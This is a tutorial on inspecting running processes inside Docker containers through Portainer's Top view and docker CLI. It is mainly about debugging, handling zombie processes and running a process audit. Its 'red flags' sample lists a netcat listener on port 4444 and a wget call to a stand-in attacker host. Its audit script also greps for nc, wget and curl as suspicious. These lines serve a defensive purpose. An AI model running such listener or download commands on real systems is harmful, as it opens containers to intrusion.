# How to View Running Processes Inside a Container in Portainer

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Portainer, Docker, Containers, Debugging, DevOps

Description: Learn how to view the running processes inside a Docker container using Portainer's built-in top view, equivalent to running docker top.

## Introduction

Sometimes you need to see what processes are running inside a container - useful for debugging, verifying that only expected processes are running, or identifying runaway processes consuming resources. Portainer provides a "top" view for containers that shows running processes without needing to exec into the container.

## Prerequisites

- Portainer installed with a connected Docker environment
- A running container to inspect

## Step 1: Access the Top View

1. Navigate to **Containers** in Portainer.
2. Click on a running container's name.
3. Look for the **Top** button or tab on the container details page.

This shows a table of all processes running inside the container, similar to the Unix `top` or `ps` commands.

## Step 2: Understanding the Process List

The top view shows columns similar to `ps aux`:

```text
PID     USER     TIME     COMMAND
1       root     0:00     nginx: master process nginx -g daemon off;
30      101      0:00     nginx: worker process
31      101      0:00     nginx: worker process
```

| Column | Description |
|--------|-------------|
| PID | Process ID inside the container |
| USER | User running the process |
| TIME | CPU time used |
| COMMAND | Full command that started the process |

## Step 3: What to Look For

### Expected Processes

A healthy Nginx container should only show:
```text
1    root    nginx: master process
30   nginx   nginx: worker process
31   nginx   nginx: worker process
```

### Unexpected Processes (Red Flags)

```text
1    root    /bin/sh                     ← Shell running (from exec session?)
45   root    nc -l 0.0.0.0 -p 4444       ← Reverse shell (security concern!)
50   root    wget http://attacker.com    ← Downloading something?
```

A production container should only run the processes its image was designed to run.

### Zombie Processes

```text
PID     STATUS    COMMAND
1234    Z         [my-app] <defunct>
```

`Z` status = zombie (process completed but parent hasn't collected its exit status). This often indicates a missing `init` process or improper signal handling.

## Step 4: Docker CLI Equivalent

```bash
# View processes in a container:

docker top my-container

# With ps options:
docker top my-container aux

# Output:
UID     PID    PPID   C    STIME   TTY   TIME       CMD
root    1234   1219   0    10:00   ?     00:00:00   nginx: master process
101     1256   1234   0    10:00   ?     00:00:01   nginx: worker process
```

## Step 5: Investigating High CPU Processes

If `docker stats` shows high CPU but you don't know which process:

1. Open the Top view in Portainer.
2. Identify the process consuming CPU.
3. Note its PID.

```bash
# Get more details about a specific process (from inside the container):
docker exec my-container cat /proc/1234/status
docker exec my-container strace -p 1234   # Trace system calls (if strace available)
```

## Step 6: Process Investigation with Exec

For deeper investigation, combine Top with Exec:

```bash
# Via Portainer console or docker exec:

# See all processes with resource usage:
ps aux

# See process tree:
ps axjf

# Find processes using a port:
ss -tlnp | grep :8080
# Or:
lsof -i :8080

# Check a specific process:
cat /proc/1/cmdline | tr '\0' ' '
cat /proc/1/environ | tr '\0' '\n'

# Monitor process CPU in real-time:
top -b -n 1 | head -20
```

## Step 7: Handling Zombie Processes

Zombie processes indicate the parent isn't reaping children. Fix with `--init`:

```yaml
# docker-compose.yml
services:
  app:
    image: myorg/myapp:latest
    init: true   # Use Docker's tini init process (PID 1)
    # tini properly reaps zombie processes
```

Or use `tini` directly in your Dockerfile:

```dockerfile
FROM ubuntu:22.04

# Install tini
RUN apt-get update && apt-get install -y tini

ENTRYPOINT ["/usr/bin/tini", "--"]
CMD ["/app/my-app"]
```

## Step 8: Security Auditing with Process View

Use the top view for quick security audits:

```bash
#!/bin/bash
# audit-container-processes.sh
# Check for unexpected processes in containers

EXPECTED_PROCESSES=("nginx" "node" "python" "java")

for container in $(docker ps -q); do
    name=$(docker inspect --format '{{.Name}}' "$container")
    echo "=== Checking: ${name} ==="

    # Get running processes
    procs=$(docker top "$container" --format "{{.Command}}" 2>/dev/null | tail -n +2)

    echo "${procs}"

    # Check for shells that shouldn't be there
    if echo "${procs}" | grep -E "(bash|sh|nc|wget|curl -X)" > /dev/null; then
        echo "⚠️  WARNING: Suspicious process in ${name}"
    fi
done
```

## Step 9: When Top Doesn't Work

If the Top view is unavailable or empty:

- **Container uses `pid: host`**: Container shares host PID namespace; shows host processes.
- **Container is stopped**: Top only works on running containers.
- **Minimal container**: Some distroless images have very minimal process tables.
- **Permission denied**: Portainer user may not have the necessary Docker permissions.

## Conclusion

Portainer's container top view provides a quick window into the processes running inside your containers - essential for debugging performance issues, verifying container contents, auditing security, and identifying zombie processes. Combined with the exec console for deeper investigation, you have powerful tools for container introspection directly from the Portainer web interface.
